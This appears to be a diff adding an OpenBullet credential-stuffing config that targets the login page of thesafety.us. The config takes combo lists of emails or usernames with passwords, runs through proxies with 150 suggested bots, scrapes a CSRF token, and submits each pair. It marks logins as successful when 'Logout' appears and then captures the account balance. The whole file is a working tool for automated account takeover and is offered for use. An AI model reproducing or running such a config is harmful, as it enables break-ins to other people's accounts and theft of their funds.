@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "thesafety.us",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-12T17:39:00.5684299+03:00",
+  "AdditionalInfo": "Captures Balance",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Sightfell",
+  "Version": "1.2.1.6",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Token REQUEST POST "https://thesafety.us/site/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Referer: https://thesafety.us/site/login" 
+  HEADER "Host: thesafety.us" 
+
+PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\">" -> VAR "token" 
+
+#Login REQUEST POST "https://thesafety.us/site/login" 
+  CONTENT "_csrf=<token>&LoginForm%5Busername%5D=<USER>&LoginForm%5Bpassword%5D=<PASS>&LoginForm%5BrememberMe%5D=0&login-button=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Referer: https://thesafety.us/site/login" 
+  HEADER "Host: thesafety.us" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\">The username or password you entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+
+#Balance PARSE "<SOURCE>" LR "balance\">" "</a>" -> CAP "Balance" 
+
